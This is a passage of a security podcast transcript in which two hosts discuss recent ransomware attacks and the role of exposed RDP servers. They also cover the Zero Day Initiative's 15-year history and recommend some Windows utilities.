STEVE:  Yes, that's it exactly.  Of course ransomware gangs are not all the same.  And didn't we hear - oh, no, it wasn't.  It was Canon that had some information leaked last week that we reported on.  And so Lawrence over at BleepingComputer has said that they assumed, since Canon got themselves back up relatively quickly, that they had paid the ransom.  But now, since the extortionists in that instance were leaking the information, maybe Canon had restored from backups and said, nah, we're not paying your stinking ransom, and the bad guys said okay, here comes your private corporate next decade plans for the future.  How do you want that?  How do you feel about that being leaked?



Anyway, so in this case the University of Utah explained that it had dodged a major ransomware incident, and that the attackers managed to encrypt only 0.02% of the data stored on their servers, and the university staff was easily able to restore that from backups.  However, the ransomware group then threatened to release student-related data...



LEO:  Oh, see, they can't let that happen, yeah, yeah.



STEVE:  ...they had obtained and exfiltrated.  So the university said:  "After careful consideration, the university decided to work with its cyber insurance provider to pay a fee to the ransomware attacker.  This was done as a proactive and preventive step to ensure information was not released on the Internet."  And again, to the extent that such can be ensured.  "The university's cyber insurance policy paid part of the ransom, and the university covered the remainder.  No tuition, grant, donation, state, or taxpayer funds were used to pay the ransom."  I thought that was an interesting explicit statement that they made.



And they said the university disclosed that the attack took place a little over a month ago, on July 19th, 2020; and that the network belonging to the College of Social and Behavioral Science was the victim.  So apparently a subset of the entire larger university was where the break-in occurred, and there must have been some isolation there.  So anyway, that is one of the three.  And presumably they were able to negotiate a cheaper payment because the bad guys hadn't managed to get the bulk of the university's stuff.  But they did pay for the promise to not share student data.  And as you said, Leo, the reason that would be honored is, well, they got nearly half a million dollars, and they want to be able to use that.



LEO:  They want to do it again.



STEVE:  Yeah, exactly.  



LEO:  You've got to build your credibility.



STEVE:  Exactly.  And two other larger and notable recent ransomware victims were Brown-Forman, famous for their distillation of Jack Daniels Tennessee Whiskey, and Carnival Cruises.  The Jack Daniels folks said:  "Our quick actions upon discovering the attack prevented our systems from being encrypted.  Unfortunately" - again - "we believe some information, including employee data, was impacted.  We are working closely with law enforcement, as well as world-class third-party data security experts, to mitigate and resolve this situation as soon as possible.  There are no active negotiations."



So it sort of sounds like - oh, in fact that statement from Brown-Forman came after Bloomberg News reported that it had received an anonymous tip of the ransomware attack.  A site on the dark web claiming to be run by members of the REvil strain of ransomware says that it had obtained a terabyte of data from the Louisville, Kentucky-based Brown-Forman.  The site said that stolen data included contracts, financial statements, credit histories, and internal correspondence of employees.  Also included were screenshots of file structures and documents purportedly taken during the heist.



So it does look like the pattern we're seeing now is, because major companies that have the deep pockets also have the pocket depth to now proactively back up their servers, well, so it's possible for them, if the only thing done was encryption, a golden opportunity to extract a ransom could be thwarted if the good guys have backups.  And so now what's being done is the data pre-encryption is being exfiltrated and stored somewhere.  Then the data is encrypted.  And so we have, you know, we're increasingly seeing this two-part attack:  exfiltration, that the company desperately does not want to be made public, in case they have backups, in which case they would not otherwise need to pay the extortion.  So it's not really ransomware as much as it is, okay, we've got copies of all your stuff.  Shall we share it with the world?



LEO:  It's plain old blackmail.



STEVE:  Yup.  And as for Carnival Corporation, the operator of the world's biggest cruise lines, they disclosed that they were hit by a ransomware attack that provided unauthorized access to personal data of passengers and employees.



LEO:  That could be bad because that could be passport information, as well as address, name, birth date.  I don't know if they collect socials.  But, boy, that's a lot of information they have.  And credit card numbers, of course.



STEVE:  Do they have passport information because they're - they're taking you across country borders.



LEO:  Yeah.  When you sign up for a cruise - and it's very rare that a cruise is just within one nation.  If you're going to another country, they collect your passport.  So they have screenshots of it.



STEVE:  You mean they physically, like...



LEO:  Yeah, yeah.  They hold it.



STEVE:  ...we'll hold it while you're with us?



LEO:  Yeah.



STEVE:  Wow.  Yup.



LEO:  And I've been on many...



STEVE:  So the company has not yet identified - huh?



LEO:  I've been on many of their cruise lines because they own most of them.



STEVE:  Yeah, well, you were doing the tech cruises.



LEO:  Holland America was one of them, yeah.  That was Holland America.  Seabourn was a recent cruise of mine.  And of course Carnival's a big one of its own right.  They own a lot of the cruise lines.



STEVE:  Well, in fact you and Lisa like the whole cruise modality; right?



LEO:  Oh, we love cruises.  We won't be going on one anytime soon.



STEVE:  Them were the days.



LEO:  Yeah.  I look back on that with nostalgia and affection.  The good old days.



STEVE:  Yeah, I was actually talking to my buddy Mark Thompson, whom you know.  He's launched a little project to provide air quality monitoring in real-time to health clubs.



LEO:  Oh, he should.  He must.  That's great.  Good for him.



STEVE:  Yeah.  And in fact I don't know how much of this I can talk about.  So I'm not going to say anything more.



LEO:  Just leave it at that.



STEVE:  I just realized.  But we were talking about the air quality in cruise lines as opposed to airliners.  And it turns out that the air is fully, completely exchanged on an airplane very often.



LEO:  Right.



STEVE:  But not so on a cruise line.



LEO:  Oh, interesting.



STEVE:  Which deliberately maintains a closed cycle system because the external air is often not what passengers want to be breathing.



LEO:  It's kind of muggy.



STEVE:  No control over humidity.  It's subtropical or whatever.



LEO:  Yeah, it's very muggy.  Although the lines I go on, the small ships I go on, we always have a balcony and windows we can open.  And we always eat outside.  So I'm not so worried about that.  But I would imagine, some of those big ships, you're not breathing outside air ever.



STEVE:  No, no.  And so it is internally recycled and not of the highest quality.  So anyway, Carnival said that they had not yet identified which of their many subsidiary lines was breached.  But because they are publicly traded, they did need to disclose to the U.S. Securities & Exchange Commission the nature of the attack in their regulatory filing.



They said:  "Based on its preliminary assessment and on the information currently known (in particular, that the incident occurred in a portion of a brand's information technology systems), the Company does not believe the incident will have a material impact on its business, operations, or financial results.  Nonetheless, we expect that the security event included unauthorized access to personal data of guests and employees, which may result in potential claims from guests, employees, shareholders, or regulatory agencies.  Although we believe that no other information technology systems of the other Company's brands have been impacted by this incident based upon our investigation to date, there can be no assurance that other information technology systems of the Company's brands will not be adversely affected."  So a CYA statement for the regulatory requirements.



Which brings me to an interesting set of reports that were just released.  Certainly we all likely agree that a ransomware attack is the last thing any company wants, given what we keep seeing.  So the question is, how exactly are these occurring?  The traditional answer has been phishing email, which hooks some well-meaning but unsuspecting insider.  Well, while phishing email is indeed a popular entry point vector, these three recent reports from Coveware, Emsisoft - I keep tripping over that - Emsisoft, and Recorded Future clearly show that phishing actually takes a backseat to our old friend RDP.



And I have a chart on page 2 of the notes which is really interesting.  This is Ransomware Attack Vectors over time.  And it would be a pie chart except a pie chart can't show percentage change over time.  So this is a line chart from fourth quarter of 2018 through the second quarter of 2020, so up to current, where it's showing the percent of cases of RDP compromise, email phishing, software vulnerability, or other.  So it's like a pie chart varying over time.  So consequently, for example, in the fourth quarter of 2018, by far and away the majority of the attacks, looks like maybe, just eyeballing it, maybe 85% were RDP.  That came down as a percentage as...



LEO:  This can't be right.  This makes no - is RDP that big a problem?



STEVE:  Yes, it is, yes.



LEO:  Holy cow.



STEVE:  And these guys provide the raw data to back that up.



LEO:  And it's Windows RDP; right?  It's Microsoft Windows.



STEVE:  Yes.  Windows is 100% RDP.  And so email phishing did come up as a percentage, which pushed the percentage of RDP down.  But it's holding its own.  And then of course what happened now in 2020, well, in the first and second quarters of 2020, is due to the COVID and the dramatic increase of hastily brought up RDP services in order to allow remote access, that essentially began fighting with email phishing as an entry point.  So those are the two.



But email phishing never even reached parity with RDP.  It's gone up and down, but RDP is holding its own, which I think is one of the things that I'm going to spend some time talking about here.  In their report, Emsisoft explained what's happened this year.  They said:  "In recent months, organizations across every sector have come to rely heavily on Remote Desktop Protocol (RDP) to maintain business continuity while respecting social distancing."



And I'll back up a little bit, Leo, just to address your comment.  Remember that there have been a series of really bad authentication problems with RDP.  This is why I've been saying you just can't...



LEO:  Well, I know, but who the hell uses RDP?  Don't they use VPNs and other solutions?  Who's using RDP?  That's nuts.



STEVE:  No.  No.  There are 80,000, eight zero thousand, exposed RDP services on the Internet.  It is absolutely crazy.  But they're just assuming that, oh, yeah, you know, it must be secure because Microsoft says we can turn it on.  Well, Microsoft said that once about Windows printer and file sharing, and we know how that went.



LEO:  See, but Barracuda in their ad says 91% of all ransomware attacks come through phishing email, spear phishing emails.  And every one I've heard about is a spear phishing email.  I can't imagine Canon or Carnival or any of these people as using RDP.  That's crazy.



STEVE:  Well, in terms of number I'm sure it's the smaller guys that aren't deploying the technology that they need to.  Anyway, so Emsisoft said:  "However, the rapid shift to remote working has also provided a unique opportunity for ransomware groups.  Threat actors predicted that many organizations would not have the time or resources to securely implement RDP during the mass transition to working from home and, as a result, may be vulnerable to compromise.  They were right.  According to a McAfee report, the number of Internet-exposed RDP ports grew from approximately" - oh, boy, I low-balled it - from approximately, are you sitting down, Leo? - "3 million in January of 2020 to more than 4.5 million in March."  So in less than three months, an additional 1.5 million additional RDP ports became publicly exposed.



Later in their report they note that, while the threat is not new, and of course as we know all too well on this podcast, the global shift to remote working has revealed that many organizations do not adequately secure RDP, and that the bad guys are taking advantage.  According to a report by Kaspersky, at the start of March 2020 there were about 200,000 daily brute-force RDP attacks in the U.S.  But by mid-April, just six weeks later, that number had grown from 200,000 to nearly 1.3 million brute-force attacks per day.



Now, today, RDP is regarded as the single biggest attack vector for ransomware.  So all of these 4.5 million RDP ports are publicly exposed, and they are being actively attacked.  And what is to me shocking is that, even now, Microsoft has not stepped up and offered better security.  And so of course this obviously underscores a point I've been making, which is that RDP simply cannot be safely exposed to the public Internet.  And there are two reasons.  It's no longer sane to trust that Microsoft hasn't or won't make a mistake in their provision of the RDP service.  They've done so over and over in the past.  And as we'll be learning in a few minutes, they just released an emergency patch for two more privilege elevation flaws in Windows remote access service, which is what RDP is part of.



The second reason we cannot trust RDP is that its native authentication mechanisms are pathetic.  I went looking for something that I thought I might not know about RDP authentication, thinking Microsoft must have fixed this.  And I found a very recent, it was only a couple months old, best practices advisory from Microsoft on securing RDP authentication.  It amounted to "Be sure to use a strong password."  There is zero multifactor support for RDP, which is unconscionable.



There are multiple third parties who have responded to this need created by Microsoft by creating their own, much more secure RDP gateways, which are laden with authentication features.  So if you don't feel like rolling your own solution, and you do have money to burn because none of these third-party solutions are inexpensive, you could simply throw some money at the problem and buy yourself this much-needed security.  Or you could get a bit clever and roll your own.



If the clients you have connecting have fixed IPs, restricting access to the RDP port from only those IPs is an immediate, proven, fast, and secure solution.  If the IPs are largely fixed, as with the typical residential broadband service, the use of a DynDNS solution can allow for tracking their infrequent but possible changes.  And typical changes may be so infrequent that updating the access firewall from DynDNS doesn't even need to be automated.  I know that the IPs that I maintain in my two locations, they're essentially static.  They haven't changed, like, in years.  But if highly dynamic roaming access is needed, then no form of IP-based access restriction will suffice.  This lifts the requirement for authentication from the network layer to the application layer.



Again, history teaches that what we must avoid is public access to an RDP endpoint.  There's no safe way to protect it.  We can't trust Microsoft, and we can't allow for this brute forcing of our authentication.  You know, 1.3 million attacks per day is ongoing right now.  So that requires the use of something in front of the RDP endpoint.  I've talked about using a VPN offering and where the VPN offers some form of strong multifactor authentication, either a time-based one-time password or certificate-based.



But I wanted to add another option to the pot by noting that SSH is widely available, almost always offers the very strong authentication options that we're looking for, and it can be used to tunnel RDP.  In fact, if you google "tunnel rdp over ssh," you'll be rewarded with all the suggestions you might need, and for all OS platforms.  As I was thinking about this, the only theoretical downside is that, as a purist, both RDP and SSH use TCP.  Long ago, when we were first covering the operation of VPNs in this podcast's deep history, I noted that there can be some tunnel confusion when TCP is tunneled inside TCP, since then you have two sets of TCP's error recovery and packet retransmission.



The theoretical optimal solution is for the VPN tunnel to use dumb old UDP packets for the tunnel protocol, and then RDP over TCP, which is carried by the UDP tunnel.  So that way the RDP's TCP protocol handles any packet losses and retransmission, and those are carried over UDP.  I did find some SSH UDP tunneling systems.  But there was so much apparent success with simply tunneling RDP over standard SSH TCP tunnels that it appears my theoretical concerns might be nothing more than that, just theoretical.  So anyway, I wanted to propose another option to the need for somehow hiding RDP endpoints from the outside world.  It's clearly necessary to add some other layer of security in front of RDP.



LEO:  Somebody in our chat whose company uses it says they use a proxy server in front of it, so it's not a publicly available IP address.



STEVE:  Right.



LEO:  Yeah, which makes a lot of sense.



STEVE:  You just have to hide it.



LEO:  Yeah.



STEVE:  And I'll mention one more Microsoft issue, and then we'll take our second break.  Last Thursday, Microsoft issued an emergency out-of-cycle update for Windows 8.1, 8.1 RT, and Windows Server, the matching server instance of 8.1, which was Windows Server 2012 R2.  The emergency update patches a pair of recently disclosed security vulnerabilities.  I have a link in the show notes because from my reading of this it doesn't look like this is going to be an automatic update.  Maybe they'll roll them out next month.



What's interesting is they're both high-severity privilege escalation vulnerabilities residing in the Remote Access Service, which is obviously a particularly vulnerable area of a server.  Interestingly, both of these vulnerabilities were patched as part of the previous week's August Patch Tuesday, but that was for Windows 10, Windows 7 for those on extended support, and Windows Server 2008, 2012, 2016, 2019, and Windows Server versions 1903, 1909, and 2004 systems.  In other words, everything other than Windows 8.1 and its corresponding Server 2012 R2.



So as near as I can determine, it's just that these patches for those two operating systems just weren't ready in time to make whatever quality control, if any, Microsoft is applying to the monthly patch cycle.  But at the same time they were too critical for Microsoft to leave them hanging since somebody examining the patches, and we now know that happens, somebody examining the patches for the other OSes could probably figure out what it was that was fixed and note that that had not been fixed in Windows Server 2012 R2 and then perhaps go attack it by reverse-engineering what had been fixed in all the other platforms.  So as I said, it may be that they need to be manually patched and installed.  It wasn't clear.



And assuming that they'll be part of next month's patch batch, I would say that end users probably don't need to worry because Windows 8.1 probably doesn't have any remote access services publicly exposed in the typical end user environment behind a NAT router.  So unless you're actually running Windows Server 2012 R2, you probably don't need to worry.  But if you are, I would certainly think it worth going to get that, or making sure that it isn't already updated by Microsoft.



LEO:  This Coveware article, I think, tells you why it's so big.  Because it's one particular kind of ransomware, Phobos, that focuses on RDP, and it's ransomware as a service.  So any idiot can go, and all the credentials are available online for pennies.  So any idiot can go either to a Shodan or get some credentials.  And then you don't have to know what you're doing.  Whereas any spear phishing attack, anything more sophisticated is going to take a lot more effort.  So this is low-hanging fruit.  You probably don't make a lot of money with it, you know, these are the $100, $200, $300 ransomwares.  They're not getting a half million.



STEVE:  Yes.  And in fact what you have just said is exactly where we're headed after our second break.  And I even used the phrase "low-hanging fruit."



LEO:  Yeah, yeah.



STEVE:  Yup.



LEO:  Now I understand.  Because it's counterintuitive, but of course it's not because lots of people who don't know what they're doing are putting RDP out in the public, which is so dumb.



STEVE:  Exactly, exactly.



LEO:  So dumb.  And there are so many better solutions out there.  But, you know, it comes with Windows, you know, it's available.  Why not?



STEVE:  Yeah, turn it on.



LEO:  Yeah.  Wow.  And then they're using monkey123 as the password.  I mean, it's got to be the same people; right?



STEVE:  Shhh, don't tell anybody, Leo.  That's mine.



LEO:  Secret.  Of course you're getting bit.



STEVE:  How did you guess it on the first try?



LEO:  It's probably not very lucrative.



STEVE:  Wow, you're good.



LEO:  You know, if you really want the money, you're going to go out and find a company and target them and take some time.  And then that's when you can exfiltrate data, do all those fun things.  Make a lot more money, I would imagine.  Wow.  Wow.  I can't believe that in this day and age.



STEVE:  So speaking of low-hanging fruit.



LEO:  Yes.



STEVE:  Iranian script kiddies are using RDP to deploy the Dharma ransomware.  This was some interesting and disturbing research by a group known as Group-IB.  They detailed the collision of RDP and ransomware.  They explain that apparently, like from all the forensic evidence, these look like low-skilled hackers - I'll explain why in a second - likely from Iran, have joined the ransomware business, targeting companies in Russia, India, China, and Japan.  They're going after the new low-hanging fruit represented by casually or hastily deployed RDP servers using publicly available tools.



The group is deploying the Dharma ransomware.  And based on the forensic artifacts of the attacks, it appears to be a non-sophisticated, purely financially - as opposed to for example politically or state-level - motivated group, which is new to cybercrime.  Their extortion demands range - they're pretty modest - from one to five bitcoin, which puts it at around, what, $11,700 up to maybe $60,000.  And they locate targets the old-fashioned way, by scanning IP address ranges for exposed remote desktop protocol, RDP endpoints.



Their tool of choice is a freely available open source port scanner called Masscan we've talked about before.  Once they've located a potential target, which is to say they found port 3389 open, they launch a brute force authentication attack using another tool, NLBrute, which is a utility that simply repeatedly attempts to authenticate against RDP using a list of username and passwords, attempting to find a combination that works.  If they get in, they sometimes attempt to elevate their privileges by exploiting an old vulnerability which exists in Windows 7 through 10.



And researchers at this company Group-IB learned about the new group a couple of months ago, in June, during an incident response engagement at a company in Russia that had been attacked.  Based on that forensic analysis and the artifacts from that, they determined the attacker to probably be a "Persian-speaking newbie."  The conclusion is supported by clues from the next stages that they found of the attack, which appear to lack the confidence that you would expect from an actor who knows essentially what to do once they've gotten in.  It's like, oh, we got in.  Now what?



LEO:  What do you recommend now?



STEVE:  Group-IB wrote:  "Interestingly, the threat actors likely don't have a clear plan for what to do with the compromised networks.  Once they've established the RDP connection, they decide which tools to deploy to move laterally.  For instance, to disable built-in AV software, the attackers used Defender Control and Your Uninstaller."  Which are tools available, sort of generic, in order to get done what they want.  Nothing very sophisticated there.  Further evidence that the operation is the work of a script kiddie from Iran comes from search queries in Persian to find other tools necessary for the attack.  It's like, uh, okay, let's see, what should we search for now to do something?



LEO:  It's probably a 12 year old.



STEVE:  Yeah.  Anyway, those searches were turned up in Persian-language Telegram channels which provide those tools.



LEO:  Oh, yeah.  Of course, yeah.



STEVE:  The number of victims compromised so far by this attacker is not known, nor is the path that led the threat actor to the Dharma ransomware as a service operation (RaaS).  But given that the Dharma operators provide a toolkit that makes it easy for anyone to become a cybercriminal, it should not come as a surprise that inexperienced individuals are deploying this file-encrypting malware.  It's like, oh, oh yeah, wait, now we're supposed to launch the Dharma, once they get in.



So the senior analyst at Group-IB, a guy named Oleg Skulkin, said that the Dharma ransomware source code, which was leaked in March, likely explained the increasing use of this malware strain.  Oleg indicated that:  "It's surprising that Dharma landed in the hands of Iranian script kiddies, who are using it for financial gain, as Iran has traditionally been a land of state-sponsored attacks engaged in espionage and sabotage."  So in other words, maybe it's not that surprising because it's sort of now available for everyone, not just state-level actors.



And of course we've talked about how this new ransomware as a service model is allowing many hackers who would never be in the ransomware game to become players.  And given that we have ransomware as a service now, I don't see how this problem is ever going to go away.  So again, no exposed open RDP ports; okay?  Not for our listeners.  Arrange to put something, anything, in front of RDP so that you or your company are not open to exploitation.  This is not as bad as Microsoft's original wide-open Windows file and printer sharing, which is what drove me to create GRC's ShieldsUp! service so many years ago.  But it does definitely need attention.  No exposed RDP ports.



The Zero Day Initiative (ZDI) that we've also referred to recently turned 15, as I mentioned at the top of the show.  It turns out that there's a bit of a synchronized 15th birthday since last Thursday Pwn2Own's founding parent, the Zero Day Initiative, also turned 15, just as this podcast did.  Our first podcast, as I mentioned, was August 15th, 2005, one day before the founding of the ZDI program.



LEO:  That's interesting.



STEVE:  Yeah, one day.  On last week's occasion of their 15th birthday, ZDI announced that more than $25 million in bounties had been paid to security researchers over the past decade and a half.  Those monies went to more than 10,000 security researchers across more than 7,500 successful bug submissions.  In explaining the genesis of ZDI they said:  "Starting in 2005, 3Com" - remember them? - "3Com announced a new program called the Zero Day Initiative.  The plan was to financially reward researchers who discover previously unknown software vulnerabilities and disclose them responsibly.  The information about the vulnerability would be used to provide early protection to customers through TippingPoint's IPS (Intrusion Prevention System) filters, while the Zero Day Initiative then worked with the affected product's vendor to fix the vulnerability."



So that's an interesting angle here.  The commercial TippingPoint IPS would benefit from providing immediate awareness of a vulnerability and could offer their proprietary customers, their commercial customers, unique early protection, thanks to the IPSes being immediately updated before any fix was available from the vendor.  Which as we know could take, like, 90 days or more.  Then of course the vendor would then fix the problem downstream of the IPS eventually.  But even after the vendor's problem was fixed, there's certainly some value in knowing when attacks are being launched against one's IPS protection, even when there's no backend vulnerability any longer.



So anyway, that's how this happened is that 3Com said let's get in the business of collecting this information from hackers.  That will allow us to mature our intrusion protection system in advance of any vendor's vulnerabilities being fixed.  We offer our protected customers this window of safety for their own backend systems, and we're going to turn this into a commercial venture.



So they ended up saying that first year ZDI published a total of one advisory, pertaining to Symantec's Veritas NetBackup.  "Fifteen years later," they said, "we've now published" - as I said at the top - "1,500 advisories as we evolved into the world's largest vendor-agnostic bug bounty program.  To say it's been a journey is an understatement.  It's certainly had some ups and downs, but the program is stronger than ever and on track for our largest year ever.  As we begin our 16th year" - as they did last week, as we did last week - "let's take a look at some of the more notable happenings in the life of the ZDI program."



So I read through the entire posting, and it provided such a useful and synchronized perspective and walk through the 15 years of this podcast, I decided I wanted to share it with our listeners.  So here's what they said.  Through the years of 2005 through 2010, their first five years, they wrote:  "Looking back at our activities through these years induces nostalgia as it reminds us of the bugs we bought in products and companies that are no longer with us.  We can also see the rise of research into different products and technologies.  For example, we bought only two Apple bugs in 2006.  That number rose to 52 by 2010.  Java bugs, particularly sandbox escapes, were also popular during this time."  And of course we were talking about them on this podcast all the time.



They wrote:  "It's a bit odd to look back at the progression from buying bugs in what was simply known as 'Java,' to buying bugs in 'Sun Microsystems Java,' to buying bugs in 'Oracle's Java.'  This time period also saw the first Pwn2Own contest, which was in 2007.  The contest launched at a time when 'I'm a Mac; I'm a PC' commercials dominated the airwaves..."



LEO:  That puts it into context.



STEVE:  Remember that?  Yeah.



LEO:  Yeah, long time ago, yeah.



STEVE:  Yeah, "...and Apple devices had an aura of invincibility about them.  Astute security researchers knew better, and Dino Dai Zovi proved it, winning himself a MacBook and $10,000.  The contest has grown exponentially since then.  There are now three different competitions:  Pwn2Own Vancouver" - the main one that we often, well, we always cover - "which focuses on enterprise software; Pwn2Own Tokyo, which focuses on consumer devices; and Pwn2Own Miami, introduced this year with a focus on SCADA products.  Pwn2Own also served as a 'coming out' for many high-profile researchers who, after winning the contest, went on to work on various prestigious teams and projects."



So from 2010 to 2015, their second five-year block, they said:  "This was a transitional period for the program as 3Com, together with ZDI, was purchased by Hewlett-Packard, then later split off as part of HP Enterprise.  However, the core principles upon which the program was founded remain the core principles we operate by today," four of them:  "Encourage the responsible disclosure of zero-day vulnerabilities to the affected vendors.  Fairly credit and compensate the participating researchers, including yearly bonuses for researchers who are especially productive within the program.  Hold product vendors accountable by setting a reasonable deadline for remediating reported vulnerabilities."



And remember we talked about a six-month ZDI, the patience that ZDI had for six months and then finally disclosed it publicly.  That was one of Microsoft's, one of those two zero-days that Microsoft didn't fix until ZDI disclosed it, and then they thought, uh-oh, because they just dragged their heels.  And, finally:  "Protect our customers and the larger ecosystem."



So they said:  "By this time the ZDI was large enough to have an impact on the overall ecosystem.  It was during this period that we grew to become the world's largest vendor-agnostic bug bounty program, a title we still hold.  In 2011 we had our first public zero-day disclosure when a vendor failed to meet the patch deadline.  Over the years, holding vendors accountable has helped lower their response time from more than 180 days to less than 120. Even though we reduced our disclosure window, the rate of zero-day disclosure stayed relatively consistent.



"Another big change during this period was the increase in research work done by the vulnerability researchers employed by the ZDI program.  There have always been great people working on the program doing root cause analysis on submissions, but an increase in the size of the team allowed for members of ZDI to begin reporting their own bugs, as well.  ZDI researchers increasingly published their findings and expanded their speaking at high-profile conferences including Black Hat and Defcon.



"The increased size also helped spot some trends in exploitation.  It was during this time that we saw a surge in submissions of Java bugs.  However, once browsers implemented click-to-play, practical exploitation became more difficult.  Bugs exploiting use-after-free conditions in IE were also quite common until the Isolated Heap and MemGC mitigation were silently introduced by Microsoft.  ZDI researchers found a way to exploit the mitigations and were awarded $125,000 from Microsoft for their submission.  Interestingly, Microsoft chose not to fix all the submitted bugs, so a portion of the report ended up as a public-release zero-day."  And they said:  "In case you're wondering, all of the money was donated to various STEM charities.



"During this timeframe, the bug bounty landscape became normalized and broadened.  Vendors such as Microsoft and Google started their own bounty programs.  And bug bounty programs were created that allowed companies like Starbucks and Uber to offer bounties."  And as we know, by "bug bounty programs were created," what they mean, without naming them, of course, is HackerOne, which we have spoken of often and just recently.



They wrote:  "The idea of crowdsourcing research entered the mainstream.  Not every program was successful, as some vendors suddenly realized that, if you offer money for bug reports, you get bug reports.  This left some companies scrambling to react after starting their program with mixed results.  It was definitely a time of growth and learning throughout the industry.



"Pwn2Own continued to grow, as well.  2010 saw Pwn2Own's first successful mobile device exploit, demonstrated by Ralf-Philipp Weinmann and Vincenzo Iozzo against the Apple iPhone 3GS.  We also started seeing vendors release large patches just before the contest.  Since the rules require the 'latest version' for all exploits, contestants" - Pwn2Own contestants - "often found themselves 'patched out' just before the contest.  It also meant the ZDI had to scramble to get the targets up to date with all of the latest patches, often staying up all night installing updates.  In 2012, a second contest, Mobile Pwn2Own, was added to focus on phones and tablets."



And finally, the final five years, 2015 to present:  "In 2015, Trend Micro acquired the HP TippingPoint IPS and the ZDI program along with it.  This opened a new world of opportunity for ZDI, as the vulnerability intelligence produced by the ZDI program could now be used to improve not only the TippingPoint IPS, but other products within Trend Micro's line of security solutions, as well.  ZDI's association with Trend Micro also resulted in a massive increase in interest in vulnerabilities in Trend Micro products themselves.  To their credit, Trend Micro product teams have not shied away from the work of fixing the bugs submitted by independent ZDI researchers, and we have established a Targeted Initiative Program just for select Trend products.



"The threat landscape shifted, as well.  Before 2015, we rarely saw an Adobe Reader submission outside of Pwn2Own.  Once we reached 2015, there were more than 100 submissions.  Many of those reports were submitted by ZDI researchers.  Overall, internal finds represent about 20% of all the cases we process every year.  Bugs affecting Acrobat, Foxit, and other PDF readers continue to be prevalent.  But we've also seen the rise of deserialization bugs and a sharp increase in SCADA vulnerabilities.  Home routers have also become a popular target since they can be compromised en masse to be used in botnets and DDoS attacks.  As a result, the ZDI adapted and began accepting hardware-related submissions, especially those related to IoT devices.



"The introduction of the Wassenaar Arrangement posed some challenges, especially when purchasing bug reports from member countries.  However, we were able to navigate the paperwork needed to transfer 'cyber arms' and stay on the right side of the law.  The virtualization category was introduced to Pwn2Own in 2016, and since that time we've had several guest-to-host escapes demonstrated."  Of course we've talked about those on the podcast.  "The contest celebrated its 10th anniversary in 2017 by acquiring 51 zero-day vulnerabilities over the three-day contest.  In 2019 we partnered with Tesla to award a Model 3 to a pair of researchers who exploited the car's infotainment system.  ZDI researchers also demonstrated their own exploit of the infotainment system.



"The contestants have changed over the years, as well.  In the beginning, individual researchers made up the majority of entries with only a few teams participating.  At one point, this shifted to most participants being teams sponsored by their employers.  There have been instances of teams filing bug reports with vendors before the contest in the hopes of killing their competitors' exploits.  In the past couple of years, that has shifted back towards individuals and small independent teams.



"And we've never stopped growing.  We hit our peak of 1,450 published advisories in 2018, and we're set to eclipse that this year.  In fact, we've been recognized as the world's leading vulnerability research organization for the past 13 years.  According to Omdia, the ZDI was responsible for over half of all measured vulnerability disclosures in 2019, more than any other vendor."



And finally, moving forward, they said:  "Over the past 15 years we've seen trends in the exploit economy and vulnerability marketplace come and go.  But through it all, we've been laser-focused on one thing:  making the digital world more secure, one CVE at a time.  Through the tireless work of ZDI researchers and the wider community, we're determined to continue disrupting the vast cybercrime economy and raising the bar for enterprise software security for the next 15 years and beyond."



So anyway, interesting walk through the past 15 years, which pretty much corresponds with the podcast.  And we've covered all this stuff along the way.



LEO:  Completely parallel, yeah.



STEVE:  Very cool.  So a couple of bits of miscellany.  I mentioned that I had finally found what I consider to be a useful bloatware remover for Windows 10.  I actually knew about it before, and I had forgotten about it.  And I was reminded of it by a tweet for something else this company does.  And I thought, oh, yeah, I remember O&O.  Anyway, they're O ampersand O, O&O.  And the one I like is O&O AppBuster.  If you just google "O&O AppBuster," you'll find it, from O&O Software.  It's free.  They have various commercial offerings.  So I think this is sort of a bit of a loss leader for them.  But of all the things I've tried, I like this one the best.  It is comprehensive.  If you enable the display of hidden things, which you probably should not, then you are able to really get yourself in trouble.



But anyway, I just wanted to point our listeners at O&O AppBuster.  It's a nice utility.  You don't need to install it.  It just runs.  It's standalone.  So you can just drop it on your desktop.  If you make changes, it will create a little companion file outside of itself where it stores those changes.  But that also allows you to move them around.  Anyway, I like it a lot.  And it's what I've been using, and I will continue to use when I want to decrapify a new installation of Windows 10 with all this ridiculous animated tiles and candy cane crap.  I just, again, I can't believe what's been done to Windows.



On a serious note, I've been using something now for about a year that I can honestly say I have fallen in love with.  It is a modest program called Remote Utilities for Windows.  It is paid.  It's a commercial app.  It's a remote control app.  I've  looked around at them all and went through a period about a year ago of trying them all.  In my case, the need was that Lorrie, my significant other, whom you've all heard me mention from time to time, we wanted to set her up with the ability to do remote neurofeedback.  What that meant was that she would send out a laptop, an EEG amplifier, and the required EEG electrodes.  In that laptop would be a bunch of software which would provide real-time feedback about some aspects of her client's brain functioning.



And it works like regular, you know, any sort of feedback where it exposes something that your brain is doing, and you learn to push it in the direction you're supposed to, and you're able to thus modify the function of your brain.  It works.  She's had a whole bunch of interesting and really heartwarming successes, especially with kids.  But the point is she needed remote access to these laptops.  She needed to be able to work with the person remotely, change settings, basically remote control.  I looked at everything.  And this is what we've been using for the last year, and it is such a win, I just wanted to put it on our listeners' radar.



As I said, it's commercial.  It is not a subscription.  Being an old fart myself, I would not consider it if you had to pay by the month.  And everything is turning into a subscription model, which just irks me.  So they have a number of different licenses to suit enterprise needs.  If you have modest needs, they have a free license that will allow you to put the connection settings for up to 10 remote machines in your viewer's address book.  I purchased a license because - and in fact Greg, my own tech support guy, has a little business on the side helping his clients.  He completely fell in love with it and has switched to using it.  Lorrie has, as I said, been using it for a year. 



LEO:  How much?



STEVE:  It's not expensive.  You can find - they have, like, various pricing plans.  Again, you can use, for free, you can put 10 remote computers under control.  The host app is what goes on the remote machine.  What they call the "viewer" is used by you, the tech, in order to get access to the remote machines.  You can use their infrastructure in order to knit the machines together.  But if that makes you feel uncomfortable, you can also use a self-hosted server which you put somewhere, which allows these things to connect to each other through NAT.



So this all does NAT routing and rendezvous services.  There's also an agent which can be used for spontaneous access to a remote system without installation.  You would just, if you immediately needed to get access to a remote system, you would just send this agent to that person, who would run it on their machine, and then you would have access to it with the proper security.



PCWorld in their review of Remote Utilities wrote:  "For power users, there's plenty to like about Remote Utilities.  Several connection modes are offered beyond the full remote desktop experience.  There's also file transfer mode, remote device manager, a registry viewer, remote webcam access, and a terminal mode which is an excellent way to perform simple command line tasks remotely."



